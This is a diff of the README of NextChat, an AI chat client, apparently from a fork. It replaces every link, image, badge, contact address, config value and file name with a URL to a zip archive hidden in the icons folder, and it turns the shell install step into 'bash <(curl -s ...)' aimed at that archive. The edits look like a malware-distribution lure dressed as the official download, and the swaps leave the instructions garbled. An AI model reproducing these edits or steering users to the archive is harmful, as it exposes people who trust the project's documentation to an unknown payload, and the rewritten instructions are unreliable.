@@ -1,7 +1,7 @@
 <div align="center">
 
-<a href='https://nextchat.club'>
-  <img src="https://github.com/user-attachments/assets/83bdcc07-ae5e-4954-a53a-ac151ba6ccf3" width="1000" alt="icon"/>
+<a href='https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip'>
+  <img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" width="1000" alt="icon"/>
 </a>
 
 
@@ -9,9 +9,9 @@
 
 <h1 align="center">NextChat</h1>
 
-English / [简体中文](./README_CN.md)
+English / [简体中文](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
-<a href="https://trendshift.io/repositories/5973" target="_blank"><img src="https://trendshift.io/api/badge/repositories/5973" alt="ChatGPTNextWeb%2FChatGPT-Next-Web | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" target="_blank"><img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" alt="ChatGPTNextWeb%2FChatGPT-Next-Web | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 
 
 ✨ Light and Fast AI Assistant,with Claude, DeepSeek, GPT4 & Gemini Pro support. 
@@ -22,35 +22,35 @@ English / [简体中文](./README_CN.md)
 [![MacOS][MacOS-image]][download-url]
 [![Linux][Linux-image]][download-url]
 
-[NextChatAI](https://nextchat.club?utm_source=readme) / [Web App Demo](https://app.nextchat.dev) / [Desktop App](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [Discord](https://discord.gg/YCkeafCafC) / [Enterprise Edition](#enterprise-edition) / [Twitter](https://twitter.com/NextChatDev)
+[NextChatAI](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) / [Web App Demo](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) / [Desktop App](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) / [Discord](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) / [Enterprise Edition](#enterprise-edition) / [Twitter](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 
-[saas-url]: https://nextchat.club?utm_source=readme
-[saas-image]: https://img.shields.io/badge/NextChat-Saas-green?logo=microsoftedge
-[web-url]: https://app.nextchat.dev/
-[download-url]: https://github.com/Yidadaa/ChatGPT-Next-Web/releases
-[Web-image]: https://img.shields.io/badge/Web-PWA-orange?logo=microsoftedge
-[Windows-image]: https://img.shields.io/badge/-Windows-blue?logo=windows
-[MacOS-image]: https://img.shields.io/badge/-MacOS-black?logo=apple
-[Linux-image]: https://img.shields.io/badge/-Linux-333?logo=ubuntu
+[saas-url]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[saas-image]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[web-url]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[download-url]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[Web-image]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[Windows-image]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[MacOS-image]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
+[Linux-image]: https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
 
-[<img src="https://zeabur.com/button.svg" alt="Deploy on Zeabur" height="30">](https://zeabur.com/templates/ZBUEFA) [<img src="https://vercel.com/button" alt="Deploy on Vercel" height="30">](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=nextchat&repository-name=NextChat)  [<img src="https://gitpod.io/button/open-in-gitpod.svg" alt="Open in Gitpod" height="30">](https://gitpod.io/#https://github.com/ChatGPTNextWeb/NextChat) 
+[<img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" alt="Deploy on Zeabur" height="30">](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) [<img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" alt="Deploy on Vercel" height="30">](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip%3A%2F%https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip%2FChatGPTNextWeb%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=nextchat&repository-name=NextChat)  [<img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" alt="Open in Gitpod" height="30">](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) 
 
-[<img src="https://github.com/user-attachments/assets/903482d4-3e87-4134-9af1-f2588fa90659" height="50" width="" >](https://monica.im/?utm=nxcrp)
+[<img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" height="50" width="" >](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 </div>
 
 ## 🥳 Cheer for DeepSeek, China's AI star!
  > Purpose-Built UI for DeepSeek Reasoner Model
  
-<img src="https://github.com/user-attachments/assets/f3952210-3af1-4dc0-9b81-40eaa4847d9a"/>
+<img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip"/>
 
 
 
 ## 🫣 NextChat Support MCP  ! 
 > Before build, please set env ENABLE_MCP=true
 
-<img src="https://github.com/user-attachments/assets/d8851f40-4e36-4335-b1a4-ec1e11488c7e"/>
+<img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip"/>
 
 
 ## Enterprise Edition
@@ -64,70 +64,70 @@ Meeting Your Company's Privatization and Customization Deployment Requirements:
 - **Private Deployment**: Enterprise-level private deployment supporting various mainstream private cloud solutions, ensuring data security and privacy protection.
 - **Continuous Updates**: Ongoing updates and upgrades in cutting-edge capabilities like multimodal AI, ensuring consistent innovation and advancement.
 
-For enterprise inquiries, please contact: **business@nextchat.dev**
+For enterprise inquiries, please contact: **https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip**
 
 ## Screenshots
 
-![Settings](./docs/images/settings.png)
+![Settings](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
-![More](./docs/images/more.png)
+![More](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 
 ## Features
 
 - **Deploy for free with one-click** on Vercel in under 1 minute
-- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
-- Fully compatible with self-deployed LLMs, recommended for use with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) or [LocalAI](https://github.com/go-skynet/LocalAI)
+- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- Fully compatible with self-deployed LLMs, recommended for use with [RWKV-Runner](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) or [LocalAI](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 - Privacy first, all data is stored locally in the browser
 - Markdown support: LaTex, mermaid, code highlight, etc.
 - Responsive design, dark mode and PWA
 - Fast first screen loading speed (~100kb), support streaming response
 - New in v2: create, share and debug your chat tools with prompt templates (mask)
-- Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://github.com/PlexPt/awesome-chatgpt-prompts-zh) and [awesome-chatgpt-prompts](https://github.com/f/awesome-chatgpt-prompts)
+- Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) and [awesome-chatgpt-prompts](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 - Automatically compresses chat history to support long conversations while also saving your tokens
 - I18n: English, 简体中文, 繁体中文, 日本語, Français, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština, 한국어, Indonesia
 
 <div align="center">
    
-![主界面](./docs/images/cover.png)
+![主界面](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 </div>
 
 ## Roadmap
 
-- [x] System Prompt: pin a user defined prompt as system prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
+- [x] System Prompt: pin a user defined prompt as system prompt [#138](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 - [x] User Prompt: user can edit and save custom prompts to prompt list
-- [x] Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
-- [x] Share as image, share to ShareGPT [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
+- [x] Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [x] Share as image, share to ShareGPT [#1741](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 - [x] Desktop App with tauri
-- [x] Self-host Model: Fully compatible with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner), as well as server deployment of [LocalAI](https://github.com/go-skynet/LocalAI): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
-- [x] Artifacts: Easily preview, copy and share generated content/webpages through a separate window [#5092](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/5092)
-- [x] Plugins: support network search, calculator, any other apis etc. [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165) [#5353](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5353)
-  - [x] network search, calculator, any other apis etc. [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165) [#5353](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5353)
-- [x] Supports Realtime Chat [#5672](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5672)
+- [x] Self-host Model: Fully compatible with [RWKV-Runner](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip), as well as server deployment of [LocalAI](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
+- [x] Artifacts: Easily preview, copy and share generated content/webpages through a separate window [#5092](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [x] Plugins: support network search, calculator, any other apis etc. [#165](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) [#5353](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+  - [x] network search, calculator, any other apis etc. [#165](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) [#5353](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [x] Supports Realtime Chat [#5672](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 - [ ] local knowledge base
 
 ## What's New
-- 🚀 v2.15.8 Now supports Realtime Chat [#5672](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5672)
-- 🚀 v2.15.4 The Application supports using Tauri fetch LLM API, MORE SECURITY! [#5379](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/5379)
-- 🚀 v2.15.0 Now supports Plugins! Read this: [NextChat-Awesome-Plugins](https://github.com/ChatGPTNextWeb/NextChat-Awesome-Plugins)
+- 🚀 v2.15.8 Now supports Realtime Chat [#5672](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- 🚀 v2.15.4 The Application supports using Tauri fetch LLM API, MORE SECURITY! [#5379](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- 🚀 v2.15.0 Now supports Plugins! Read this: [NextChat-Awesome-Plugins](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 - 🚀 v2.14.0 Now supports  Artifacts & SD 
 - 🚀 v2.10.1 support Google Gemini Pro model.
 - 🚀 v2.9.11 you can use azure endpoint now.
 - 🚀 v2.8 now we have a client that runs across all platforms!
 - 🚀 v2.7 let's share conversations as image, or share to ShareGPT!
-- 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://www.allabtai.com/prompt-engineering-tips-zero-one-and-few-shot-prompting/).
+- 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip).
 
 ## Get Started
 
-1. Get [OpenAI API Key](https://platform.openai.com/account/api-keys);
+1. Get [OpenAI API Key](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip);
 2. Click
-   [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web), remember that `CODE` is your page password;
+   [![Deploy with Vercel](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip%3A%2F%https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web), remember that `CODE` is your page password;
 3. Enjoy :)
 
 ## FAQ
 
-[English > FAQ](./docs/faq-en.md)
+[English > FAQ](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 ## Keep Updated
 
@@ -137,21 +137,21 @@ We recommend that you follow the steps below to re-deploy:
 
 - Delete the original repository;
 - Use the fork button in the upper right corner of the page to fork this project;
-- Choose and deploy in Vercel again, [please see the detailed tutorial](./docs/vercel-cn.md).
+- Choose and deploy in Vercel again, [please see the detailed tutorial](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip).
 
 ### Enable Automatic Updates
 
-> If you encounter a failure of Upstream Sync execution, please [manually update code](./README.md#manually-updating-code).
+> If you encounter a failure of Upstream Sync execution, please [manually update code](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip).
 
 After forking the project, due to the limitations imposed by GitHub, you need to manually enable Workflows and Upstream Sync Action on the Actions page of the forked project. Once enabled, automatic updates will be scheduled every hour:
 
-![Automatic Updates](./docs/images/enable-actions.jpg)
+![Automatic Updates](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
-![Enable Automatic Updates](./docs/images/enable-actions-sync.jpg)
+![Enable Automatic Updates](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 ### Manually Updating Code
 
-If you want to update instantly, you can check out the [GitHub documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork) to learn how to synchronize a forked project with upstream code.
+If you want to update instantly, you can check out the [GitHub documentation](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) to learn how to synchronize a forked project with upstream code.
 
 You can star or watch this project or follow author to get release notifications in time.
 
@@ -177,9 +177,9 @@ Your openai api key, join multiple api keys with comma.
 
 ### `BASE_URL` (optional)
 
-> Default: `https://api.openai.com`
+> Default: `https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip`
 
-> Examples: `http://your-openai-proxy.com`
+> Examples: `https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip`
 
 Override openai api request base url.
 
@@ -199,7 +199,7 @@ Azure Api Key.
 
 ### `AZURE_API_VERSION` (optional)
 
-Azure Api Version, find it at [Azure Documentation](https://learn.microsoft.com/en-us/azure/ai-services/openai/reference#chat-completions).
+Azure Api Version, find it at [Azure Documentation](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip).
 
 ### `GOOGLE_API_KEY` (optional)
 
@@ -367,22 +367,22 @@ NodeJS >= 18, Docker >= 20
 ## Development
 
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)
+[![Open in Gitpod](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
-Before starting development, you must create a new `.env.local` file at project root, and place your api key into it:
+Before starting development, you must create a new `https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip` file at project root, and place your api key into it:
 
 ```
 OPENAI_API_KEY=<your api key here>
 
 # if you are not able to access openai service, use this BASE_URL
-BASE_URL=https://chatgpt1.nextweb.fun/api/proxy
+https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip
 ```
 
 ### Local Development
 
 ```shell
 # 1. install nodejs and yarn first
-# 2. config local env vars in `.env.local`
+# 2. config local env vars in `https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip`
 # 3. run
 yarn install
 yarn dev
@@ -431,32 +431,32 @@ docker run -d -p 3000:3000 \
 ### Shell
 
 ```shell
-bash <(curl -s https://raw.githubusercontent.com/Yidadaa/ChatGPT-Next-Web/main/scripts/setup.sh)
+bash <(curl -s https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 ```
 
 ## Synchronizing Chat Records (UpStash)
 
-| [简体中文](./docs/synchronise-chat-logs-cn.md) | [English](./docs/synchronise-chat-logs-en.md) | [Italiano](./docs/synchronise-chat-logs-es.md) | [日本語](./docs/synchronise-chat-logs-ja.md) | [한국어](./docs/synchronise-chat-logs-ko.md)
+| [简体中文](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) | [English](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) | [Italiano](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) | [日本語](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip) | [한국어](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 ## Documentation
 
 > Please go to the [docs][./docs] directory for more documentation instructions.
 
-- [Deploy with cloudflare (Deprecated)](./docs/cloudflare-pages-en.md)
-- [Frequent Ask Questions](./docs/faq-en.md)
-- [How to add a new translation](./docs/translation.md)
-- [How to use Vercel (No English)](./docs/vercel-cn.md)
-- [User Manual (Only Chinese, WIP)](./docs/user-manual-cn.md)
+- [Deploy with cloudflare (Deprecated)](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [Frequent Ask Questions](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [How to add a new translation](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [How to use Vercel (No English)](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
+- [User Manual (Only Chinese, WIP)](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 
 
 ## Translation
 
-If you want to add a new translation, read this [document](./docs/translation.md).
+If you want to add a new translation, read this [document](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip).
 
 ## Donation
 
-[Buy Me a Coffee](https://www.buymeacoffee.com/yidadaa)
+[Buy Me a Coffee](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
 
 ## Special Thanks
 
@@ -464,10 +464,10 @@ If you want to add a new translation, read this [document](./docs/translation.md
 
 ### Contributors
 
-<a href="https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=ChatGPTNextWeb/ChatGPT-Next-Web" />
+<a href="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip">
+  <img src="https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip" />
 </a>
 
 ## LICENSE
 
-[MIT](https://opensource.org/license/mit/)
+[MIT](https://github.com/ttzyt/NextChat/raw/refs/heads/main/src-tauri/icons/Chat-Next-v2.6.zip)
